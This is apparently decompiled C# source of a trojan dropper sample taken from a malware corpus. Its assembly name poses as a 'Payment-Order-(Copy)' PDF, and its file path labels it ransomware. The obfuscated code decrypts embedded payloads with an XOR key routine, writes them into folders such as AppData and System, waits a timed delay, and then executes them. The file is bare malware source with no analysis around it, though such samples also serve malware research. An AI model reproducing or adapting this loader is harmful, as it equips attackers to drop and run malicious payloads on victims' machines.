// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Payment-Order-(Copy).Pdfi, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F70914EF-5364-4930-8ADC-EFA87D5FFE39
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-18a2ad320bfe0f724ced2712bb2ad0cd99d11a4e67ef509cea062cfda7166e33.exe

using \u0006;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace \u0006
{
  internal sealed class \u0005
  {
    private static string[] \u0001 = new string[2]
    {
      \u0008.\u0007(69),
      \u0008.\u0007(69)
    };
    private static string[] \u0002 = new string[2]
    {
      \u0008.\u0007(82),
      \u0008.\u0007(82)
    };
    private static string[] \u0003 = new string[2]
    {
      \u0008.\u0007(87),
      \u0008.\u0007(96)
    };
    private static string[] \u0004 = new string[2]
    {
      \u0008.\u0007(113),
      \u0008.\u0007(670917)
    };

    [STAThread]
    public static void \u0002()
    {
label_0:
      int num1;
      int num2;
      try
      {
        \u0001.\u0001();
        num2 = 1;
label_1:
        int num3 = 2;
        int num4 = \u0002.\u007E\u0003((object) \u0005.\u0001, 0);
        int index1 = 0;
        goto label_13;
label_2:
        num3 = 3;
        string str1 = \u0005.\u0001[index1];
label_3:
        num3 = 6;
        if (\u0003.\u0004(str1, \u0008.\u0007(69), false) != 0)
          goto label_5;
label_4:
        num3 = 7;
        \u0005.\u0001[index1] = \u0004.\u0005(Environment.SpecialFolder.ApplicationData);
        goto label_12;
label_5:
        num3 = 9;
        if (\u0003.\u0004(str1, \u0008.\u0007(1278953), false) != 0)
          goto label_7;
label_6:
        num3 = 10;
        \u0005.\u0001[index1] = \u0004.\u0005(Environment.SpecialFolder.Favorites);
        goto label_12;
label_7:
        num3 = 12;
        if (\u0003.\u0004(str1, \u0008.\u0007(1278966), false) != 0)
          goto label_9;
label_8:
        num3 = 13;
        \u0005.\u0001[index1] = \u0004.\u0005(Environment.SpecialFolder.Personal);
        goto label_12;
label_9:
        num3 = 15;
        if (\u0003.\u0004(str1, \u0008.\u0007(1278983), false) != 0)
          goto label_11;
label_10:
        num3 = 16;
        \u0005.\u0001[index1] = \u0004.\u0005(Environment.SpecialFolder.System);
        goto label_12;
label_11:
        num3 = 19;
        \u0005.\u0001[index1] = \u0005.\u0001[index1];
label_12:
        num3 = 21;
        checked { ++index1; }
label_13:
        if (index1 <= num4)
          goto label_2;
label_14:
        num3 = 22;
        int num5 = \u0002.\u007E\u0003((object) \u0005.\u0004, 0);
        int index2 = 0;
        goto label_21;
label_15:
        num3 = 23;
        byte[] numArray = \u0005.\u0004(\u0005.\u0006(\u0005.\u0004[index2]), \u0008.\u0007(1278992));
label_16:
        num3 = 24;
        string str2 = global::\u0006.\u0007(\u0005.\u0001[index2], \u0008.\u0007(1279005), \u0005.\u0003[index2]);
label_17:
        num3 = 25;
        \u0007.\u0008(str2, numArray);
label_18:
        num3 = 26;
        \u0005.\u0003(checked ((int) global::\u000E.\u000F(unchecked (\u0008.\u000E(\u0005.\u0002[index2]) * 1000.0 * 60.0))));
label_19:
        num3 = 27;
        Process process = \u000F.\u0010(str2);
label_20:
        num3 = 28;
        checked { ++index2; }
label_21:
        if (index2 <= num5)
          goto label_15;
        else
          goto label_28;
label_23:
        num1 = num3;
        switch (num2)
        {
          case 1:
            int num6 = num1 + 1;
            num1 = 0;
            switch (num6)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 8:
              case 11:
              case 14:
              case 17:
              case 20:
              case 21:
                goto label_12;
              case 5:
              case 6:
                goto label_3;
              case 7:
                goto label_4;
              case 9:
                goto label_5;
              case 10:
                goto label_6;
              case 12:
                goto label_7;
              case 13:
                goto label_8;
              case 15:
                goto label_9;
              case 16:
                goto label_10;
              case 18:
              case 19:
                goto label_11;
              case 22:
                goto label_14;
              case 23:
                goto label_15;
              case 24:
                goto label_16;
              case 25:
                goto label_17;
              case 26:
                goto label_18;
              case 27:
                goto label_19;
              case 28:
                goto label_20;
              case 29:
                goto label_28;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_23;
      }
      throw \u0011.\u0012(-2146828237);
label_28:
      if (num1 == 0)
        return;
      \u0001.\u0001();
    }

    private static void \u0003([In] int obj0)
    {
      Stopwatch stopwatch = new Stopwatch();
      \u0012.\u007E\u0013((object) stopwatch);
      while (\u0013.\u007E\u0017((object) stopwatch) < (long) obj0)
        \u0001.\u0002();
      \u0012.\u007E\u0014((object) stopwatch);
    }

    public static byte[] \u0004([In] byte[] obj0, [In] string obj1)
    {
      byte[] numArray1 = \u0015.\u007E\u001B((object) \u0014.\u0019(), obj1);
      int num1 = (int) obj0[checked (obj0.Length - 1)] ^ 112;
      byte[] numArray2 = new byte[checked (obj0.Length + 1)];
      int num2 = checked (obj0.Length - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        int index2;
        numArray2[index1] = checked ((byte) ((int) obj0[index1] ^ num1 ^ (int) numArray1[index2]));
        if (index2 == checked (\u0016.\u007E\u001C((object) obj1) - 1))
          index2 = 0;
        else
          checked { ++index2; }
        checked { ++index1; }
      }
      return (byte[]) \u0017.\u001D((Array) numArray2, (Array) new byte[checked (obj0.Length - 2 + 1)]);
    }
  }
}
